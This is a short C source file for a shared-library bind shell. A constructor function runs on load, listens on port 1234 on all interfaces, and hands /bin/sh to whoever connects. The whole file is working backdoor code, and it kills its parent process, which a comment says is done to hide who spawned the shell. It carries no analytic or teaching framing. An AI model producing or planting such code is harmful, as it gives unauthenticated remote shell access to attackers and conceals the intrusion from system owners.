#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h> 
#include <sys/wait.h>
#include <stdio.h>

#define port 1234
#define addr INADDR_ANY

void __attribute__((constructor)) bind_shell(){

  // set up socket to listen for incoming connection
  int host_sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in host_addr;
  host_addr.sin_family = AF_INET;
  host_addr.sin_port = htons(port);
  host_addr.sin_addr.s_addr = addr;
  // Keep trying to connect until connection is established
  while( bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr)) != 0){
    usleep(500000);
  }
  listen(host_sock, 0);
  // accept incoming connection
  int client_sock = accept(host_sock, NULL, NULL);

  // fork process && copy stdin, stdout & stderr to client socket
  if(client_sock > 0){
    pid_t pid;
    if((pid = fork()) == 0){
      dup2(client_sock, 0);
      dup2(client_sock, 1);
      dup2(client_sock, 2);
      kill(getppid(), SIGKILL); // kill parent process to hide who spawned shell
      execve("/bin/sh", NULL, NULL); // start shell
    }else{
      wait(NULL);
    }
  }
}
